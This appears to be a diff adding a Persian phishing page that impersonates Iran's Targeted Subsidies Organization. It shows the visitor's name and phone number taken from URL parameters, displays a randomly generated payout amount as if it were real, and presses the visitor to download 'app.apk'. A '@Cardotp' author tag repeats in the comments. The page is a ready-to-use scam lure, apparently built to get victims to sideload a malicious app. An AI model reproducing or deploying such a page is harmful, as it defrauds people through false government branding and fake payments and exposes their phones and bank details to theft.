@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اطلاعات کاربر</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 24px;
+            color: #1a73e8;
+            margin-bottom: 15px;
+        }
+        p {
+            font-size: 14px;
+            color: #333;
+            margin: 10px 0;
+        }
+        .amount {
+            font-size: 24px;
+            color: #1a73e8;
+            font-weight: bold;
+            margin: 20px 0;
+            padding: 10px;
+            background-color: #e3f2fd;
+            border-radius: 5px;
+            border: 1px solid #1a73e8;
+        }
+        .footer {
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+        }
+        .download-button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+            text-decoration: none;
+            transition: background-color 0.3s ease;
+        }
+        .download-button:hover {
+            background-color: #1557b0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>اطلاعات کاربر</h1>
+        <p>جناب <strong id="nameDisplay">-</strong></p>
+        <p>شماره تلفن: <strong id="phoneDisplay">-</strong></p>
+        <h2>مبلغ تعلق گرفته به شما:</h2>
+        <div class="amount" id="randomAmount">-</div>
+        <p>به دلیل حجم بالای درخواست‌ها، لطفا از طریق اپلیکیشن اقدام نمایید.</p>
+        <a href="app.apk" class="download-button">دانلود اپلیکیشن</a>
+        <p class="footer">حقوق این سامانه متعلق به سازمان هدفمندسازی یارانه‌ها می‌باشد.</p>
+    </div>
+
+    <script>
+        // دریافت پارامترهای URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const name = urlParams.get('name') || '-';
+        const phone = urlParams.get('phone') || '-';
+        const incomeLevel = urlParams.get('incomeLevel') || '-';
+
+        // نمایش اطلاعات
+        document.getElementById('nameDisplay').textContent = name;
+        document.getElementById('phoneDisplay').textContent = phone;
+
+        // تولید یا بازیابی عدد تصادفی برای کاربر
+        let randomAmount = Math.floor(Math.random() * 2000001); // عدد بین ۰ تا ۲,۰۰۰,۰۰۰ تومان
+        document.getElementById('randomAmount').textContent = randomAmount.toLocaleString('en-US') + ' ریال';
+    </script>
+
+    <!-- تکرار آیدی سازنده کد -->
+    <!-- ⚓️ @Cardotp ⚓️ -->
+    <!-- ⚓️ @Cardotp ⚓️ -->
+    <!-- ⚓️ @Cardotp ⚓️ -->
+    <!-- ⚓️ @Cardotp ⚓️ -->
+    <!-- ⚓️ @Cardotp ⚓️ -->
+</body>
+</html>
